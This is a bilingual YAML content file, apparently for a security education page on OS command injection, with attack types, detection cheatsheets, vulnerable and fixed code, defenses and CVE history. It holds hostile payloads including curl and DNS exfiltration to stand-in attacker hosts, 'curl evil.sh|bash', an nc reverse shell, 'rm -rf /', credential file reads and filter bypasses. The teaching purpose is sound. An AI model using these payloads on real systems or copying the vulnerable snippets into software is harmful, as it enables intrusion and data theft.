sections:
  attacks:
    title:
      en: Attack types
      pl: Typy ataków
    lead:
      en: Eight ways the same root cause manifests — from a single metacharacter to a full container escape onto the host.
      pl: Osiem sposobów, w jakie ta sama przyczyna się ujawnia — od pojedynczego metaznaku po pełną ucieczkę z kontenera na host.
    items:
      - name: Shell Metacharacter Injection
        sev: critical
        description:
          en: Metacharacters ;, |, &, &&, ||, $(...) and backticks chain or terminate the intended command and append attacker-controlled ones — the canonical OS command injection.
          pl: Metaznaki ;, |, &, &&, ||, $(...) i backticki łączą lub kończą zamierzone polecenie i doklejają polecenia atakującego — kanoniczny OS command injection.
        payload: 127.0.0.1; cat /etc/passwd
      - name: Blind Time-Based
        sev: critical
        description:
          en: When no output is reflected, a measurable delay confirms execution. A sleep or ping with fixed count turns the response time into an oracle.
          pl: Gdy żaden wynik nie wraca, mierzalne opóźnienie potwierdza wykonanie. sleep lub ping o stałej liczbie zamienia czas odpowiedzi w wyrocznię.
        payload: ; sleep 10  |  | timeout 10 ping -c 10 127.0.0.1
      - name: Out-of-Band DNS Exfiltration
        sev: critical
        description:
          en: Command output is base64-encoded into a DNS lookup to an attacker-controlled domain — leaks data even when all HTTP egress is blocked.
          pl: Wynik polecenia jest kodowany base64 w zapytaniu DNS do domeny atakującego — wycieka dane nawet gdy cały ruch HTTP na zewnątrz jest zablokowany.
        payload: $(nslookup $(id|base64|tr -d "\n").oast.me)
      - name: Filter Bypass
        sev: high
        description:
          en: "Defeats naive blocklists: $IFS replaces spaces, brace expansion avoids slashes, $'\\x2f' hex chars and printf reconstruct forbidden strings."
          pl: "Pokonuje naiwne blocklisty: $IFS zastępuje spacje, brace expansion omija ukośniki, znaki hex $'\\x2f' i printf rekonstruują zabronione ciągi."
        payload: "{cat,/etc/passwd}   //  cat$IFS/etc/passwd"
      - name: Blind HTTP Callback
        sev: high
        description:
          en: When outbound HTTP is allowed, curl or wget posts captured output to the attacker — faster and higher-bandwidth than DNS exfiltration.
          pl: Gdy ruch HTTP na zewnątrz jest dozwolony, curl lub wget wysyła przechwycony wynik do atakującego — szybciej i z większą przepustowością niż DNS.
        payload: curl attacker.com/?o=$(whoami|base64)
      - name: CI/CD Pipeline Injection
        sev: critical
        description:
          en: "GitHub Actions interpolates ${{ github.head_ref }} directly into run: steps. A branch named main;curl... executes on the runner with repo secrets in scope."
          pl: GitHub Actions wstawia ${{ github.head_ref }} wprost do kroków run:. Gałąź nazwana main;curl... wykonuje się na runnerze z sekretami repo w zasięgu.
        payload: "branch: \"main;curl evil.sh|bash\""
      - name: Cloud Metadata Pivot
        sev: critical
        description:
          en: A blind injection in cloud pivots via SSRF to the instance metadata service, exfiltrates IAM role credentials, and enables lateral movement.
          pl: Ślepe wstrzyknięcie w chmurze przeskakuje przez SSRF do usługi metadanych instancji, wykrada poświadczenia roli IAM i umożliwia ruch lateralny.
        payload: curl 169.254.169.254/latest/meta-data/iam/...
      - name: Container Escape
        sev: critical
        description:
          en: Injection inside a misconfigured container (mounted Docker socket, --privileged, host PID namespace) escalates to docker exec on the host.
          pl: Wstrzyknięcie w źle skonfigurowanym kontenerze (zamontowany socket Dockera, --privileged, namespace PID hosta) eskaluje do docker exec na hoście.
        payload: docker -H unix:///var/run/docker.sock exec ...
  cheatsheet:
    title:
      en: Detection cheatsheet
      pl: Ściąga detekcji
    lead:
      en: Each detection method has its own primitives. Time-based, error-based, out-of-band DNS, stack-trace and WAF-fingerprinting techniques.
      pl: Każda metoda detekcji ma własne prymitywy. Techniki czasowe, błędowe, out-of-band DNS, stack-trace i fingerprintingu WAF.
    groups:
      - name: Time-based blind
        rows:
          - - Linux
            - ; sleep 10
          - - Ping delay
            - "| ping -c 10 127.0.0.1"
          - - Windows
            - "& timeout /T 10"
          - - Inline
            - "`sleep 10`"
          - - Signal
            - measurable response delay
          - - Tool
            - Burp Intruder timing
      - name: Error-based
        rows:
          - - Probe
            - ; cat /etc/nonexistent
          - - Result
            - 500 + path disclosure
          - - Verbose
            - stderr in HTTP body
          - - Type leak
            - binary path in error
          - - Confirm
            - differing error text
          - - Tool
            - manual fuzz / Burp
      - name: Out-of-band DNS
        rows:
          - - Vector
            - $(nslookup ...oast.me)
          - - Encode
            - id | base64 | tr -d "\n"
          - - Egress
            - bypasses HTTP firewall
          - - Collab
            - Burp Collaborator
          - - OSS
            - interactsh / oast.me
          - - Confirm
            - inbound DNS hit
      - name: Stack trace
        rows:
          - - PHP
            - backtick operator error
          - - Java
            - ProcessBuilder exception
          - - Node
            - child_process stderr
          - - Python
            - CalledProcessError trace
          - - Leak
            - cmdline in exception
          - - Confirm
            - language fingerprint
      - name: WAF fingerprint
        rows:
          - - Step 1
            - try ; and | first
          - - Step 2
            - $IFS instead of space
          - - Step 3
            - brace expansion {a,b}
          - - Step 4
            - hex $'\x2f' encoding
          - - Step 5
            - printf reconstruction
          - - Goal
            - map the blocklist
  code:
    title:
      en: Vulnerable vs Secure
      pl: Podatny vs Bezpieczny
    lead:
      en: "The same fix across four languages: never build a command string from user input — pass an argument list and skip the shell."
      pl: "Ta sama naprawa w czterech językach: nigdy nie buduj polecenia z wejścia użytkownika — przekaż listę argumentów i pomiń powłokę."
    languages:
      - label: Python
        lang: python
        vulnerable: |-
          # VULNERABLE — shell=True with an f-string interpolates user input
          host = request.args.get("host")     # e.g. 127.0.0.1; cat /etc/passwd
          subprocess.run(f"ping -c 1 {host}", shell=True)
        safe: |-
          # SECURE — argument list, no shell, no string concatenation
          host = request.args.get("host")
          subprocess.run(["ping", "-c", "1", host])   # host is one argv element
      - label: Node.js
        lang: javascript
        vulnerable: |-
          // VULNERABLE — exec spawns /bin/sh -c, metacharacters are honoured
          const { exec } = require("child_process");
          exec("ls " + userInput);   // userInput = "; rm -rf /" runs as a command
        safe: |-
          // SECURE — execFile bypasses the shell entirely
          const { execFile } = require("child_process");
          execFile("ls", [userInput]);   // userInput is a literal argument
      - label: Java
        lang: java
        vulnerable: |-
          // VULNERABLE — string concatenation passed to a shell
          Runtime.getRuntime().exec("ping " + userInput);
          // userInput = "x && curl evil.sh|bash" executes attacker code
        safe: |-
          // SECURE — ProcessBuilder takes a token list, no shell parsing
          new ProcessBuilder("ping", userInput).start();
          // userInput stays a single, unparsed argument
      - label: Go
        lang: go
        vulnerable: |-
          // VULNERABLE — sh -c re-introduces the shell grammar
          exec.Command("sh", "-c", userInput).Run()
          // userInput = "id; nc attacker 4444 -e /bin/sh"
        safe: |-
          // SECURE — invoke the binary directly with explicit args
          exec.Command("ping", userInput).Run()
          // no /bin/sh, so metacharacters carry no meaning
  langRisks:
    title:
      en: Language-specific risks
      pl: Ryzyka per język
    lead:
      en: Every language ships a shell-spawning API and a safe argument-list counterpart — except PHP, where avoiding OS commands is the only real fix.
      pl: Każdy język ma API uruchamiające powłokę i bezpieczny odpowiednik z listą argumentów — z wyjątkiem PHP, gdzie jedyną realną naprawą jest unikanie poleceń OS.
    rows:
      - fw: Python
        api: subprocess.run(f"ping {host}", shell=True)
        note:
          en: "shell=True with an f-string is the #1 RCE pattern — pass a list and drop shell=True: subprocess.run([\"ping\", host])."
          pl: "shell=True z f-stringiem to wzorzec RCE nr 1 — przekaż listę i usuń shell=True: subprocess.run([\"ping\", host])."
      - fw: Node.js
        api: child_process.exec("ls " + userInput)
        note:
          en: exec() always spawns /bin/sh -c. Use execFile("ls", [userInput]) so arguments never reach a shell.
          pl: exec() zawsze uruchamia /bin/sh -c. Użyj execFile("ls", [userInput]), by argumenty nigdy nie trafiły do powłoki.
      - fw: PHP
        api: system("ping " . $_GET['host'])
        note:
          en: PHP has no safe argument-list API for system/exec/shell_exec. The only real fix is to avoid invoking OS commands at all.
          pl: PHP nie ma bezpiecznego API listy argumentów dla system/exec/shell_exec. Jedyną realną naprawą jest unikanie wywoływania poleceń OS.
      - fw: Java
        api: Runtime.exec("ping " + userInput)
        note:
          en: Runtime.exec(String) tokenizes loosely; use new ProcessBuilder("ping", userInput) so each token is explicit and unparsed.
          pl: Runtime.exec(String) tokenizuje luźno; użyj new ProcessBuilder("ping", userInput), by każdy token był jawny i nieparsowany.
      - fw: Go
        api: exec.Command("sh", "-c", userInput)
        note:
          en: "Calling sh -c hands the shell back the grammar. Invoke the binary directly: exec.Command(\"ping\", userInput)."
          pl: "Wywołanie sh -c oddaje gramatykę powłoce. Wywołuj binarkę wprost: exec.Command(\"ping\", userInput)."
  method:
    title:
      en: Attack methodology
      pl: Metodyka ataku
    lead:
      en: How an attacker progresses from a probe to full host compromise.
      pl: Jak atakujący przechodzi od sondy do pełnej kompromitacji hosta.
    steps:
      - title:
          en: Detect
          pl: Wykrycie
        description:
          en: Inject a single metacharacter (;, |, &, $()) into every parameter that might reach a command; changed output or errors signal injectability.
          pl: Wstrzyknij pojedynczy metaznak (;, |, &, $()) w każdy parametr mogący trafić do polecenia; zmieniony wynik lub błąd sygnalizują podatność.
      - title:
          en: Confirm blind
          pl: Potwierdzenie ślepe
        description:
          en: No output? Use a time-based payload (; sleep 10) or an out-of-band DNS/HTTP callback to prove the command ran.
          pl: Brak wyniku? Użyj ładunku czasowego (; sleep 10) lub callbacku out-of-band DNS/HTTP, by udowodnić wykonanie polecenia.
      - title:
          en: Bypass filters
          pl: Obejście filtrów
        description:
          en: Defeat blocklists with $IFS for spaces, brace expansion {cat,/etc/passwd}, hex chars and printf reconstruction.
          pl: Pokonaj blocklisty przez $IFS zamiast spacji, brace expansion {cat,/etc/passwd}, znaki hex i rekonstrukcję printf.
      - title:
          en: Exfiltrate
          pl: Eksfiltracja
        description:
          en: Read secrets and stream them out — base64 over DNS ($(id|base64).oast.me) or an HTTP callback when egress is open.
          pl: Odczytaj sekrety i wyślij je — base64 przez DNS ($(id|base64).oast.me) lub callback HTTP, gdy ruch na zewnątrz jest otwarty.
      - title:
          en: Escalate
          pl: Eskalacja
        description:
          en: Pivot to cloud metadata (curl 169.254.169.254) for IAM credentials, or escape a container via a mounted Docker socket → host RCE and lateral movement.
          pl: Przeskocz do metadanych chmury (curl 169.254.169.254) po poświadczenia IAM lub uciecz z kontenera przez zamontowany socket Dockera → RCE na hoście i ruch lateralny.
  defenses:
    title:
      en: Defense layers, ranked
      pl: Warstwy obrony wg skuteczności
    lead:
      en: Defense in depth — but not all layers are equal. Avoiding the shell is the fix; everything else reduces blast radius.
      pl: Obrona w głąb — ale warstwy nie są równe. Unikanie powłoki to naprawa; reszta ogranicza skutki.
    items:
      - rank: 1
        eff: 100
        kind: primary
        label:
          en: Avoid the shell entirely
          pl: Całkowite unikanie powłoki
        note:
          en: Use argument-list APIs (execFile, ProcessBuilder, subprocess list) so no shell parses metacharacters. The definitive fix.
          pl: Używaj API z listą argumentów (execFile, ProcessBuilder, lista subprocess), by żadna powłoka nie parsowała metaznaków. Ostateczna naprawa.
      - rank: 2
        eff: 85
        kind: strong
        label:
          en: Allowlist input validation
          pl: Walidacja wejścia allowlistą
        note:
          en: Accept only a strict character set (e.g. ^[A-Za-z0-9._-]+$) or an enum of known-good values; reject everything else.
          pl: Akceptuj tylko ściśle zdefiniowany zbiór znaków (np. ^[A-Za-z0-9._-]+$) lub enum znanych wartości; odrzucaj resztę.
      - rank: 3
        eff: 70
        kind: strong
        label:
          en: Sandbox + least privilege
          pl: Sandbox + minimalne uprawnienia
        note:
          en: Run as a low-privilege user, drop capabilities, seccomp/AppArmor, no outbound network — shrinks blast radius if injection slips through.
          pl: Uruchamiaj jako użytkownik o niskich uprawnieniach, odbieraj capabilities, seccomp/AppArmor, brak ruchu wychodzącego — ogranicza skutki, gdy wstrzyknięcie się prześlizgnie.
      - rank: 4
        eff: 55
        kind: mitigation
        label:
          en: Egress filtering
          pl: Filtrowanie ruchu wychodzącego
        note:
          en: Block DNS/HTTP to untrusted destinations and the metadata IP to defeat out-of-band exfiltration and cloud pivots.
          pl: Blokuj DNS/HTTP do niezaufanych celów i IP metadanych, by udaremnić eksfiltrację out-of-band i przeskoki do chmury.
      - rank: 5
        eff: 40
        kind: mitigation
        label:
          en: Escape / quote arguments
          pl: Escapowanie / cytowanie argumentów
        note:
          en: shlex.quote / escapeshellarg as a last resort when a shell is unavoidable — error-prone, never a primary control.
          pl: shlex.quote / escapeshellarg jako ostateczność, gdy powłoki nie da się uniknąć — podatne na błędy, nigdy jako główna kontrola.
      - rank: 6
        eff: 20
        kind: weak
        label:
          en: WAF (compensating only)
          pl: WAF (tylko kompensacyjny)
        note:
          en: $IFS, brace expansion and hex encoding trivially bypass signature rules. Detective, never preventive.
          pl: $IFS, brace expansion i kodowanie hex trywialnie omijają reguły sygnaturowe. Detekcyjny, nigdy zapobiegawczy.
  incidents:
    title:
      en: Real-world incidents
      pl: Rzeczywiste incydenty
    lead:
      en: OS command injection is not theoretical — these CVEs reached CVSS 10.0 and one of them powered the 147M-record Equifax breach.
      pl: OS command injection nie jest teoretyczne — te CVE osiągnęły CVSS 10.0, a jedno z nich napędziło wyciek 147 mln rekordów w Equifax.
    items:
      - org: Shellshock
        year: 2014
        impact: CVE-2014-6271
        cost: CVSS 10.0
        description:
          en: Bash parsed trailing code in function-definition env vars, giving RCE through Apache CGI, DHCP clients and OpenSSH ForceCommand on millions of servers.
          pl: Bash wykonywał kod doklejony do zmiennych środowiskowych z definicją funkcji, dając RCE przez Apache CGI, klientów DHCP i OpenSSH ForceCommand na milionach serwerów.
      - org: Apache httpd
        year: 2021
        impact: CVE-2021-41773
        cost: CVSS 9.8
        description:
          en: Path traversal combined with mod_cgi enabled remote command execution; exploited in the wild within 24 hours of disclosure.
          pl: Path traversal w połączeniu z mod_cgi umożliwił zdalne wykonanie poleceń; eksploitowany w sieci w ciągu 24h od ujawnienia.
      - org: Text4Shell
        year: 2022
        impact: CVE-2022-42889
        cost: CVSS 9.8
        description:
          en: Apache Commons Text ${script:...} interpolation evaluated expressions that executed OS commands on the host.
          pl: Interpolacja ${script:...} w Apache Commons Text wykonywała wyrażenia uruchamiające polecenia OS na hoście.
      - org: Confluence
        year: 2022
        impact: CVE-2022-26134
        cost: CVSS 9.8
        description:
          en: OGNL injection chained into OS command execution; mass-exploited across internet-facing Confluence instances.
          pl: Wstrzyknięcie OGNL prowadziło do wykonania poleceń OS; masowo eksploitowane na instancjach Confluence wystawionych do internetu.
      - org: GitLab
        year: 2021
        impact: CVE-2021-22205
        cost: CVSS 10.0
        description:
          en: A crafted image upload reached ExifTool, which command-injected during metadata parsing for unauthenticated RCE.
          pl: Spreparowany upload obrazu trafiał do ExifTool, który wstrzykiwał polecenie podczas parsowania metadanych — RCE bez uwierzytelnienia.
      - org: Equifax
        year: 2017
        impact: 147M records
        cost: CVE-2017-5638
        description:
          en: Apache Struts command injection via a crafted Content-Type header led to one of the largest data breaches on record.
          pl: Wstrzyknięcie poleceń w Apache Struts przez spreparowany nagłówek Content-Type doprowadziło do jednego z największych wycieków danych w historii.
    inlineSources:
      - label: Shellshock CVE-2014-6271
        url: https://nvd.nist.gov/vuln/detail/CVE-2014-6271
      - label: httpd CVE-2021-41773
        url: https://nvd.nist.gov/vuln/detail/CVE-2021-41773
      - label: Text4Shell CVE-2022-42889
        url: https://nvd.nist.gov/vuln/detail/CVE-2022-42889
      - label: GitLab CVE-2021-22205
        url: https://nvd.nist.gov/vuln/detail/CVE-2021-22205
      - label: Struts CVE-2017-5638
        url: https://nvd.nist.gov/vuln/detail/CVE-2017-5638
  tools:
    title:
      en: Detection tooling
      pl: Narzędzia wykrywania
    lead:
      en: Static analysis flags user input flowing into shell calls; dynamic tools and out-of-band servers confirm blind exploitability. Use both.
      pl: Analiza statyczna oznacza wejście użytkownika trafiające do wywołań powłoki; narzędzia dynamiczne i serwery out-of-band potwierdzają ślepą eksploatowalność. Używaj obu.
    sast:
      - - Semgrep
        - python.subprocess.shell-true + taint from request.args
      - - CodeQL
        - "Dataflow: untrusted input → exec/Runtime/ProcessBuilder"
      - - Bandit
        - B602/B605 subprocess shell=True, os.system
      - - njsscan
        - child_process.exec with concatenated input
    dast:
      - - Burp Suite
        - Active Scan + Collaborator for blind OOB
      - - OWASP ZAP
        - Command injection active scan rules
      - - commix
        - Automated command-injection exploitation
      - - interactsh
        - Out-of-band DNS/HTTP callback server
    note:
      en: <strong>Key signal:</strong> grep for <code>subprocess.run(..., shell=True)</code> with f-string args, <code>os.system</code>, <code>child_process.exec</code>, <code>Runtime.exec</code> and <code>exec.Command("sh", "-c", ...)</code> — these shell-spawning calls fed by request data are the root cause.
      pl: <strong>Kluczowy sygnał:</strong> szukaj <code>subprocess.run(..., shell=True)</code> z argumentami f-string, <code>os.system</code>, <code>child_process.exec</code>, <code>Runtime.exec</code> i <code>exec.Command("sh", "-c", ...)</code> — te wywołania uruchamiające powłokę zasilane danymi żądania to przyczyna źródłowa.
  compliance:
    title:
      en: Compliance quick-reference
      pl: Szybka zgodność
    lead:
      en: Where OS command injection prevention maps onto the hard compliance gates auditors check for CWE-78.
      pl: Gdzie zapobieganie OS command injection mapuje się na twarde bramki zgodności sprawdzane przez audytorów dla CWE-78.
    items:
      - std: PCI DSS v4.0
        items:
          - 6.3.2 — inventory & review custom code
          - 6.2.4 — injection prevention techniques
          - 11.4 — penetration testing
      - std: SOC 2
        items:
